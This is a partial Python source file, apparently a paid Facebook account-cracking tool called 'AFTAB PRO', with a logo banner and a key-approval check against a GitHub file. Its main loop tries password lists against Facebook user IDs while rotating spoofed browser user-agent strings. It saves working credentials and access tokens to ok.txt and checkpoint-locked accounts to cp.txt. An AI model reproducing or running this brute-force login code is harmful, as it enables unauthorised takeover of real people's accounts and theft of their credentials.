...
def logo():
	print(f"""
\33[1;91m .d8b.  d88888b d888888b  .d8b. md8888b.      
\33[1;93md8' `8b 88'     `~~88~~' d8' `8b 88  `8D      
\33[1;94m88ooo88 88ooo      88    88ooo88 88oooY'      
\33[1;95m88~~~88 88~~~      88    88~~~88 88~~~b.      
\33[1;96m88   88 88         88    88   88 88   8D      
\33[1;93mYP   YP YP         YP    YP   YP Y8888P'              
\33[1;92m----------------------------------------------
 Author    : AFTAB x PRINCE x SHERRY 
 Github    : Toxic-Aftab x PRINCE-BRAND
 Facebook  : Prince Prince x SK BADSHAH
 Tool Name : AFTAB PRO
 Type type : PAID
 Version   : 2.1
----------------------------------------------
 AFTAB Pro version 2.1
 MY \33[1;91mSISTER \33[1;92mIS MY CRIME PARTNER 😌
 \33[1;92m------------------------------------------------
""")
def logo2():
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Toxic-Aftab/Approve.txt/blob/main/Approve.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] FACEBOOK :  https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB")
...
def notice():
	...
	runtxt("\033[0;97m Key Approval ke Lai FaceBook pr follow Krein >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Key Facebook pr massage krein")
	os.system("xdg-open https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB")
	subprocess.check_output(["am", "start", "https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Toxic-Aftab/Approve.txt/blob/main/Approve.txt').text
			if basesplit in plr:
				key = basesplit
...
""")
		...
		print("───────────────────────────────────────────────────────× ")
		print(" \t\033[1;97m[\x1b[1;97m\x1b[1;41m FOLLOW ME ON FACEBOOK FIRST\x1b[0m\x1b[1;97m] \033[1;37m ")
		subprocess.check_output(["am", "start", "https://www.facebook.com/FBMASTER.HACKERGANGSTER.AFTAB"])
		print("───────────────────────────────────────────────────────× ")
...
'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
 ...
 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		sys.stdout.write(
			"\r\r %s[>_] [AFTAB] : %s/%s -> \033[0;92m [ AFTAB-OK:%s ]- \033[0;91m[AFTAB-CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [AFTAB=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [AFTAB=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [AFTAB=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [AFTAB=OK=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #AFTAB copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    : AFTAB,SK,PRINCE ")
		print(" [*] Team      :  AFTAB,SK,PRINCE\n")
		print(" [ Social Medi  ] \n")
		print(" [*] Facebook  : prince prince x SK BADSHAH")
		exit(" [*] GitHub    : https://github.com/Toxic-Aftab ")
	else:
		Main()
